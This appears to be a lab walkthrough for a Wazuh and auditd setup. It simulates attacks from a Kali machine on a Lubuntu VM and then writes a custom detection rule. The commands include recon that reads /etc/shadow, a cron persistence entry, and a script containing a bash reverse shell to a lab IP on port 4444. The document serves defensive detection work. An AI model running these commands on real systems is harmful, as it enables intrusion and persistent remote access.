# **1.Attack Simulation** 
before starting the task : 
on wazuh :
```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard
```
on lubunto : 
```bash
sudo systemctl status auditd
sudo systemctl status wazuh-agent
sudo auditctl -l
sudo grep -a "Connected" /var/ossec/logs/osseclog | tail -5
```
on kali:
```bash
ping -c 3 192.168.2.128
```
## 1.1 Get SSH Access from Kali to LubuntuVM
on lubunto : 
```bash
sudo systemctl status ssh
```
on kali : 
```bash
ssh mariem@192.168.2.128
```
## 1.2 Attack A: Privilege Escalation Recon
```bash
whoami
id
uname -a
sudo -l
cat /etc/passwd
sudo cat /etc/shadow
find / -perm -4000 -type f 2>/dev/null
```
## 1.3 Attack B: Unauthorized Persistence via Cron
```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'whoami > tmp/attacker_was_here.txt'") | crontab -
crontab -l
echo '#!/bin/bash' > /tmp/malicious_backdoor.sh
echo 'bash -i >& /dev/tcp/192.168.2.192/4444 0>&1' >> /tmp/malicious_backdoor.sh
chmod +x /tmp/malicious_backdoor.sh
```
## 1.4 Attack C: Sensitive File Tampering
```bash
sudo cat /etc/sudoers
```
### Simulate attempting to add a backdoor user entry (we’ll just view, not actually corrupt)
```bash
sudo cat /etc/passwd | tail -5
```
### Touch /etc/passwd metadata (triggers your passwd-changes auditd rule)
```bash
sudo touch /etc/passwd
```
## 1.5 Confirm Telemetry is Flowing
```bash
sudo ausearch -k exec_commands | tail -20
sudo ausearch -k exec_changes | tail -20
```
# **2. Telemetry Analysis**
## 2.2 Filter By the Audit key
```bash
sudo ausearch -k passwd_changes --start recent
```
# **3.Custom Decoders & Rules**
## 3.2 Write Rule 1: Privilege Escalation Recon Detection
```xml
<!--Rule 1 : Privilege escalation recon detection -->
<group name="custom_attack,linux_recon,">
<rule id="100002" level="12">
<if_sid>92600</if_sid>
<field name="audit.key">exec_commands</field>
<field name="audit.exe" type="pcre2">\/usr\/bin\/sudo|\/usr\/bin\/whoami|\/usr\/bin\/id</field>
<description>Possible privilege escalation recon: suspicious command executed</description>
<mitre>
<id>T1548.003</id>
</mitre>
</rule>
</group>
```











